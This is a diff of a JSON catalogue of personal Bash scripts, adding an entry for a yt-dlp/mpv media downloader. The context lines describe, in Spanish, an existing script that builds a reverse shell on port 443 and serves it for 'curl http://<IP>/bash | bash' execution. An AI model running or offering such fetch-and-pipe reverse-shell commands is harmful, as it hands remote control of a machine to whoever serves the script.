@@ -53,6 +53,15 @@
         "short_desc": "Genera un script de reverse shell y lanza un servidor HTTP.",
         "detailed_desc": "Este script detecta automáticamente la IP del sistema, genera un script de reverse shell en /tmp/apache/bash con conexión TCP hacia esa IP por el puerto 443, y ofrece iniciar un servidor HTTP en la misma ruta. El script está diseñado para ser descargado y ejecutado remotamente mediante curl, por ejemplo: 'curl http://<IP>/bash | bash'."
     },
+    "bajar": {
+        "name": "bajar",
+        "short_desc": "Downloads MP3 audio, best video, or streams a URL with mpv.",
+        "detailed_desc": [
+            "This Bash script wraps yt-dlp and mpv for quick media downloads or playback from a URL.",
+            "It supports MP3 audio extraction with -3, highest-quality video download with -4, and best-quality streaming with -v.",
+            "It prints a small colorized help message when arguments are missing or an option is invalid."
+        ]
+    },
     "barrierinst": {
         "name": "barrierinst",
         "short_desc": "Installs Barrier via Flatpak and sets up a startup alias.",
